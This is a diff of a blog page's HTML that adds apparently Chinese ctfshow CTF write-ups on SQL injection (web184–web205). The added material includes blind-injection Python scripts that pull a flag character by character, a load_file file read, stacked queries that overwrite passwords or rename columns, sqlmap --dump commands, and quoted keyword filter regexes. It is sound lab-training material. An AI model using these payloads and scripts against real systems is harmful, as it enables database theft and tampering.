@@ -470,7 +470,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.6k
+                    8.6k
                 </div>
                 
 
@@ -711,7 +711,7 @@ flag<span class="token operator">=</span><span class="token string">''</span>
 <ul>
 <li>之后将前五个字母改成ctfshow(受其他字段的影响)</li>
 </ul>
-<h2 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h2><pre class="line-numbers language-none"><code class="language-none">tableName&#x3D;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,1,1))regexp(char(99))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="web184-right-jion-连接函数脚本"><a href="#web184-right-jion-连接函数脚本" class="headerlink" title="web184(right jion 连接函数脚本)"></a>web184(right jion 连接函数脚本)</h2><pre class="line-numbers language-none"><code class="language-none">tableName&#x3D;ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,1,1))regexp(char(99))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <ul>
 <li>跑脚本</li>
@@ -832,10 +832,1300 @@ $<span class="token keyword">sql</span> <span class="token operator">=</span> <s
 <pre class="line-numbers language-none"><code class="language-none">username&#x3D;0password&#x3D;0e100<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsmffrz7v6j30zk0j5adf.jpg" alt="image-20210719181830774"></p>
-<h2 id="web189"><a href="#web189" class="headerlink" title="web189"></a>web189</h2><ul>
+<h2 id="web189-load-file脚本"><a href="#web189-load-file脚本" class="headerlink" title="web189(load_file脚本)"></a>web189(load_file脚本)</h2><ul>
 <li>username为1时返回查询失败，为0时返回密码错误</li>
-<li>根据这一特点，利用if语句进行盲注</li>
+<li>根据这一特点，利用if语句，根据题目所说的文件内容进行盲注</li>
 </ul>
+<pre class="line-numbers language-none"><code class="language-none">userame&#x3D;if((load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;api&#x2F;index.php&#39;)regexp(&#39;ctfshow&#123;&#39;)),1,0) &#x2F;&#x2F;注意不能有空格
+password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>跑脚本</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+
+url <span class="token operator">=</span> <span class="token string">"http://36ffb6e2-2c44-45f8-8dc4-01755702d8ab.challenge.ctf.show:8080/api/"</span>
+
+b<span class="token operator">=</span><span class="token string">'&#123;abcdefghijklmnopqrstuvwxyz-&#123;&#125;1234567890&#125;'</span>
+flag<span class="token operator">=</span><span class="token string">'ctfshow'</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> h <span class="token keyword">in</span> b<span class="token punctuation">:</span>
+        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+            <span class="token string">'username'</span><span class="token punctuation">:</span><span class="token string">"if((load_file('/var/www/html/api/index.php')regexp('&#123;&#125;')),1,0)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag<span class="token operator">+</span>h<span class="token punctuation">)</span><span class="token punctuation">,</span>
+            <span class="token string">'password'</span><span class="token punctuation">:</span><span class="token number">1</span>
+        <span class="token punctuation">&#125;</span>
+        s <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">"\\u67e5\\u8be2\\u5931\\u8d25"</span> <span class="token keyword">in</span> s<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+            flag<span class="token operator">+=</span>h
+            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag is &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="web190"><a href="#web190" class="headerlink" title="web190"></a>web190</h2><ul>
+<li>这道题只有两种报错<code>用户名不存在</code>以及<code>密码错误</code></li>
+<li>猜想，使用盲注，区分这两种错误</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">uname&#x3D;&#39; or 1 --+ &#x2F;&#x2F;密码错误
+uname&#x3D;&#39; or 0 --+ &#x2F;&#x2F;用户名不存在<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<ul>
+<li>把1用if语句加上我们的判断代替</li>
+</ul>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span><span class="token string">' or if((substr((select database()),1,1)='</span>c<span class="token string">'),1,0) --+
+uname='</span><span class="token operator">or</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<ul>
+<li>利用bp可以进行substr的数字位置和字符爆破</li>
+<li>这里写脚本</li>
+</ul>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+
+url <span class="token operator">=</span> <span class="token string">"http://6987d4e5-1823-4a03-94d8-0157f5dd4c78.challenge.ctf.show:8080/api/"</span>
+b<span class="token operator">=</span><span class="token string">"&#123;zxcvbnmasdfghjklqwertyuiop-1234567890&#125;_"</span>
+flag <span class="token operator">=</span> <span class="token string">''</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> h <span class="token keyword">in</span> b<span class="token punctuation">:</span>
+        payload <span class="token operator">=</span> <span class="token string">"' or if((substr((select group_concat(f1ag) from ctfshow_fl0g),&#123;&#125;,1)='&#123;&#125;'),1,0) -- "</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>h<span class="token punctuation">)</span>
+        <span class="token comment">#payload = "' or if((substr((select database()),&#123;&#125;,1)='&#123;&#125;'),1,0) -- ".format(i,h)</span>
+        <span class="token comment">#payload = "' or if((substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'),&#123;&#125;,1)='&#123;&#125;'),1,0) -- ".format(i,h)</span>
+        <span class="token comment">#payload = "' or if((substr((select+group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)='&#123;&#125;'),1,0) -- -".format(i,h)</span>
+        <span class="token comment">#print(payload)</span>
+        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+            <span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>
+            <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token number">1</span>
+        <span class="token punctuation">&#125;</span>
+        s<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+        <span class="token comment">#print(s.text)</span>
+        <span class="token keyword">if</span> <span class="token string">"\\u5bc6\\u7801\\u9519\\u8bef"</span> <span class="token keyword">in</span> s<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+            flag<span class="token operator">+=</span>h
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag is &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+    <span class="token keyword">if</span> flag<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"&#125;"</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag :"</span><span class="token operator">+</span>flag<span class="token punctuation">)</span>
+        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="Web191"><a href="#Web191" class="headerlink" title="Web191"></a>Web191</h2><ul>
+<li>上面的脚本，改地址就可以</li>
+</ul>
+<h2 id="web192"><a href="#web192" class="headerlink" title="web192"></a>web192</h2><ul>
+<li>上面的脚本，改地址就可以</li>
+</ul>
+<h2 id="web193-substr函数替换"><a href="#web193-substr函数替换" class="headerlink" title="web193(substr函数替换)"></a>web193(substr函数替换)</h2><p>过滤了substr可以直接用mid代替</p>
+<pre class="line-numbers language-none"><code class="language-none">left(str,n) &#x2F;&#x2F;返回前n个字符串 
+right(str,index) &#x2F;&#x2F;返回后n个字符 
+substring(str,start,length) &#x2F;&#x2F;相当于substr，mid     
+mid(str,index,ken) 截取str 从index开始,截取len的长度  相当于substr
+lpad(str,len,padstr) rpad(str,len,padstr) 在str的左(右)两边填充给定的padstr到指定的长度<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">import</span> requests
+
+url <span class="token operator">=</span> <span class="token string">"http://08a97a18-4086-4e77-b149-287c7e96cdca.challenge.ctf.show:8080/api/"</span>
+b<span class="token operator">=</span><span class="token string">"&#123;zxcvbnmasdfghjklqwertyuiop-1234567890&#125;_"</span>
+flag <span class="token operator">=</span> <span class="token string">''</span>
+<span class="token keyword">for</span> i <span class="token operator">in</span> range <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span>:
+    <span class="token keyword">for</span> h <span class="token operator">in</span> b:
+        payload <span class="token operator">=</span> <span class="token string">"' or if((mid((select group_concat(f1ag) from ctfshow_flxg),&#123;&#125;,1)='&#123;&#125;'),1,0) -- "</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>h<span class="token punctuation">)</span>
+        <span class="token comment">#payload = "' or if((left((select database()),&#123;&#125;,1)='&#123;&#125;'),1,0) -- ".format(i,h)</span>
+        <span class="token comment">#payload = "' or if((mid((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flxg'),&#123;&#125;,1)='&#123;&#125;'),1,0) -- ".format(i,h)</span>
+        <span class="token comment">#payload = "' or if((mid((select+group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)='&#123;&#125;'),1,0) -- -".format(i,h)</span>
+        <span class="token comment">#print(payload)</span>
+        <span class="token keyword">data</span> <span class="token operator">=</span> &#123;
+            <span class="token string">"username"</span>:payload<span class="token punctuation">,</span>
+            <span class="token string">"password"</span>:<span class="token number">1</span>
+        &#125;
+        s<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span><span class="token keyword">data</span><span class="token operator">=</span><span class="token keyword">data</span><span class="token punctuation">)</span>
+        <span class="token comment">#print(s.text)</span>
+        <span class="token keyword">if</span> <span class="token string">"\\u5bc6\\u7801\\u9519\\u8bef"</span> <span class="token operator">in</span> s<span class="token punctuation">.</span><span class="token keyword">text</span>:
+            flag<span class="token operator">+</span><span class="token operator">=</span>h
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag is &#123;&#125;'</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+    <span class="token keyword">if</span> flag<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">=</span> <span class="token string">"&#125;"</span>:
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag :"</span><span class="token operator">+</span>flag<span class="token punctuation">)</span>
+        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="web194"><a href="#web194" class="headerlink" title="web194"></a>web194</h2><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户
+$sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#123;$username&#125;;&quot;;
+  &#x2F;&#x2F;密码检测
+if(!is_numeric($password))&#123;
+  $ret[&#39;msg&#39;]&#x3D;&#39;密码只能为数字&#39;;
+  die(json_encode($ret));
+&#125;
+
+&#x2F;&#x2F;密码判断
+if($row[&#39;pass&#39;]&#x3D;&#x3D;$password)&#123;
+    $ret[&#39;msg&#39;]&#x3D;&#39;登陆成功&#39;;
+  &#125;
+
+&#x2F;&#x2F;TODO:感觉少了个啥，奇怪
+    
+    if(preg_match(&#39;&#x2F; |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#39;|\&quot;|select|union|or|and|\x26|\x7c|file|into&#x2F;i&#39;, $username))&#123;
+  $ret[&#39;msg&#39;]&#x3D;&#39;用户名非法&#39;;
+  die(json_encode($ret));
+&#125;
+
+if($row[0]&#x3D;&#x3D;$password)&#123;
+    $ret[&#39;msg&#39;]&#x3D;&quot;登陆成功 flag is $flag&quot;;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="Web195-堆叠注入"><a href="#Web195-堆叠注入" class="headerlink" title="Web195(堆叠注入)"></a>Web195(堆叠注入)</h2><ul>
+<li>堆叠注入</li>
+</ul>
+<p><code>;</code>间隔执行sql语句</p>
+<pre class="line-numbers language-none"><code class="language-none">0;update&#96;ctfshow_user&#96;set&#96;pass&#96;&#x3D;1; &#x2F;&#x2F;过滤的空格用&#96;&#96;代替
+1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h2 id="Web196"><a href="#Web196" class="headerlink" title="Web196"></a>Web196</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">  <span class="token comment">//拼接sql语句查找指定ID用户</span>
+  $<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"select pass from ctfshow_user where username = &#123;$username&#125;;"</span><span class="token punctuation">;</span>
+      
+返回逻辑
+
+  <span class="token comment">//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token string">'/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\'|\"|select|union|or|and|\x26|\x7c|file|into/i'</span><span class="token punctuation">,</span> $username<span class="token punctuation">)</span><span class="token punctuation">)</span>&#123;
+    $ret<span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'用户名非法'</span><span class="token punctuation">;</span>
+    die<span class="token punctuation">(</span>json_encode<span class="token punctuation">(</span>$ret<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  &#125;
+
+  <span class="token keyword">if</span><span class="token punctuation">(</span>strlen<span class="token punctuation">(</span>$username<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">16</span><span class="token punctuation">)</span>&#123;
+    $ret<span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'用户名不能超过16个字符'</span><span class="token punctuation">;</span>
+    die<span class="token punctuation">(</span>json_encode<span class="token punctuation">(</span>$ret<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  &#125;
+
+  <span class="token keyword">if</span><span class="token punctuation">(</span>$<span class="token keyword">row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">=</span>$password<span class="token punctuation">)</span>&#123;
+      $ret<span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"登陆成功 flag is $flag"</span><span class="token punctuation">;</span>
+  &#125;
+      <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">1;select(1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="web197"><a href="#web197" class="headerlink" title="web197"></a>web197</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">查询语句
+  <span class="token comment">//拼接sql语句查找指定ID用户</span>
+  $<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"select pass from ctfshow_user where username = &#123;$username&#125;;"</span><span class="token punctuation">;</span>
+      
+返回逻辑
+
+  <span class="token comment">//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">'/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set//i'</span><span class="token punctuation">,</span> $username<span class="token punctuation">)</span><span class="token punctuation">)</span>&#123;
+    $ret<span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'用户名非法'</span><span class="token punctuation">;</span>
+    die<span class="token punctuation">(</span>json_encode<span class="token punctuation">(</span>$ret<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  &#125;
+
+  <span class="token keyword">if</span><span class="token punctuation">(</span>$<span class="token keyword">row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">=</span>$password<span class="token punctuation">)</span>&#123;
+      $ret<span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"登陆成功 flag is $flag"</span><span class="token punctuation">;</span>
+  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>alert命令</p>
+<pre class="line-numbers language-none"><code class="language-none">alert table &#96;table_name&#96; change &#96;old_column&#96; &#96;new_column&#96; varchar(255)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>payload:</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token punctuation">;</span>alert <span class="token keyword">table</span> <span class="token punctuation">`</span>ctfshow_user<span class="token punctuation">`</span> change <span class="token punctuation">`</span>pass<span class="token punctuation">`</span> <span class="token punctuation">`</span>uuu<span class="token punctuation">`</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">;</span>alert <span class="token keyword">table</span> <span class="token punctuation">`</span>ctfshow_user<span class="token punctuation">`</span> change <span class="token punctuation">`</span>id<span class="token punctuation">`</span> <span class="token punctuation">`</span>pass<span class="token punctuation">`</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span>
+username<span class="token operator">=</span><span class="token number">0</span>
+password<span class="token operator">=</span><span class="token number">1</span> <span class="token comment">//开始爆破。。。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>由于原来的pass被修改，id又被改为pass，所以后台查询正整的pass实际上查的是id</li>
+</ul>
+<h2 id="web198"><a href="#web198" class="headerlink" title="web198"></a>web198</h2><ul>
+<li>同上</li>
+</ul>
+<h2 id="Web199"><a href="#Web199" class="headerlink" title="Web199"></a>Web199</h2><pre class="line-numbers language-none"><code class="language-none">1;show tables
+ctfshow_user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h2 id="web200"><a href="#web200" class="headerlink" title="web200"></a>web200</h2><ul>
+<li>同上</li>
+</ul>
+<h2 id="Web201-SQLMAP练习"><a href="#Web201-SQLMAP练习" class="headerlink" title="Web201(SQLMAP练习)"></a>Web201(SQLMAP练习)</h2><p>SQLmap：</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">*</span> 查库
+python3 sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"http://5c50afc3-61fb-45c0-8ec0-6694bfb2c853.challenge.ctf.show:8080/sqlmap.php/?id=1"</span> <span class="token comment">--user-agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36" --referer="http://5c50afc3-61fb-45c0-8ec0-6694bfb2c853.challenge.ctf.show:8080/sqlmap.php" --dbs --batch</span>
+
+<span class="token operator">*</span> 查表
+python3 sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"http://5c50afc3-61fb-45c0-8ec0-6694bfb2c853.challenge.ctf.show:8080/sqlmap.php/?id=1"</span> <span class="token comment">--user-agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36" --referer="http://5c50afc3-61fb-45c0-8ec0-6694bfb2c853.challenge.ctf.show:8080/sqlmap.php" -D ctfshow_web --tables --batch</span>
+
+<span class="token operator">*</span> 查列
+python3 sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"http://5c50afc3-61fb-45c0-8ec0-6694bfb2c853.challenge.ctf.show:8080/sqlmap.php/?id=1"</span> <span class="token comment">--user-agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36" --referer="http://5c50afc3-61fb-45c0-8ec0-6694bfb2c853.challenge.ctf.show:8080/sqlmap.php" -D ctfshow_web -T ctfshow_user --columns --batch</span>
+
+<span class="token operator">*</span> 查记录
+python3 sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"http://5c50afc3-61fb-45c0-8ec0-6694bfb2c853.challenge.ctf.show:8080/sqlmap.php/?id=1"</span> <span class="token comment">--user-agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36" --referer="http://5c50afc3-61fb-45c0-8ec0-6694bfb2c853.challenge.ctf.show:8080/sqlmap.php" -D ctfshow_user -T ctfshow_user -C pass --dump --batch</span>
+
+
+<span class="token comment">--dbs 								//查数据库</span>
+<span class="token comment">--tables							//查表</span>
+<span class="token comment">--columns							//查列</span>
+<span class="token comment">--dump								//查记录</span>
+<span class="token comment">--batch 							//自动确认</span>
+<span class="token comment">--fresh-queries				//清理缓冲</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="Web202-POST提交方式"><a href="#Web202-POST提交方式" class="headerlink" title="Web202(POST提交方式)"></a>Web202(POST提交方式)</h2><ul>
+<li><strong>修改data</strong></li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">python3 sqlmap.py -u &quot;http:&#x2F;&#x2F;5c50afc3-61fb-45c0-8ec0-6694bfb2c853.challenge.ctf.show:8080&#x2F;api&#x2F;&quot; --data&#x3D;&quot;id&#x3D;1&quot; --user-agent&#x3D;&quot;Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;91.0.4472.164 Safari&#x2F;537.36&quot; --referer&#x3D;&quot;http:&#x2F;&#x2F;5c50afc3-61fb-45c0-8ec0-6694bfb2c853.challenge.ctf.show:8080&#x2F;sqlmap.php&quot; --dbs --batch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="web203-指定HTTP提交方式"><a href="#web203-指定HTTP提交方式" class="headerlink" title="web203(指定HTTP提交方式)"></a>web203(指定HTTP提交方式)</h2><ul>
+<li>修改提交方式为PUT,并提交<code>--headers=&quot;content-type:/text/plain&quot;</code></li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;1b93c376-c171-4363-b25c-914615eae8b1.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot;  --dump --data&#x3D;&quot;id&#x3D;1&quot; --refer&#x3D;&quot;http:&#x2F;&#x2F;9232b9b4-e847-4e9d-99e6-b66ca796344f.challenge.ctf.show:8080&#x2F;sqlmap.php&quot; --method&#x3D;&quot;put&quot; --headers&#x3D;&quot;content-type:text&#x2F;plain&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<h2 id="web204-提交cookie"><a href="#web204-提交cookie" class="headerlink" title="web204(提交cookie)"></a>web204(提交cookie)</h2><ul>
+<li>抓包或者插件看一下cookie，提交cookie，以及referer，headers等</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">sqlmap -u &quot;http:&#x2F;&#x2F;9232b9b4-e847-4e9d-99e6-b66ca796344f.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;2im5h2l2lf4qi0ccfdiu2oseid;ctfshow&#x3D;c38b3982aa0643e02b3eb15d21115af0&quot; --dump --data&#x3D;&quot;id&#x3D;1&quot; --refer&#x3D;&quot;http:&#x2F;&#x2F;9232b9b4-e847-4e9d-99e6-b66ca796344f.challenge.ctf.show:8080&#x2F;sqlmap.php&quot; --method&#x3D;&quot;put&quot; --headers&#x3D;&quot;content-type:text&#x2F;plain&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="Web205-http安全设置，提交cookie，referer，headers"><a href="#Web205-http安全设置，提交cookie，referer，headers" class="headerlink" title="Web205(http安全设置，提交cookie，referer，headers)"></a>Web205(http安全设置，提交cookie，referer，headers)</h2><ul>
+<li>题目环境:</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户
+$sql &#x3D; &quot;select id,username,password from ctfshow_user where id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39;;&quot;;
+      <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>返回逻辑</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;对传入的参数进行了过滤
+  function waf($str)&#123;
+   &#x2F;&#x2F;代码过于简单，不宜展示
+  &#125;
+      <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<ul>
+<li>先访问了<code>getToken.php</code></li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsnl4wiwv7j30zk0j5jtx.jpg" alt="image-20210720182110357"></p>
+<ul>
+<li>之后传值</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsnl7uhm5xj30zk0j5416.jpg" alt="image-20210720182403189"></p>
+<ul>
+<li>sqlmap在每一次注入的时候都会先访问到getToken.php</li>
+</ul>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">–safe<span class="token operator">-</span>url 设置在测试目标地址前访问的安全链接
+–safe<span class="token operator">-</span>freq 设置两次注入测试前访问安全链接的次数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>Payload：</p>
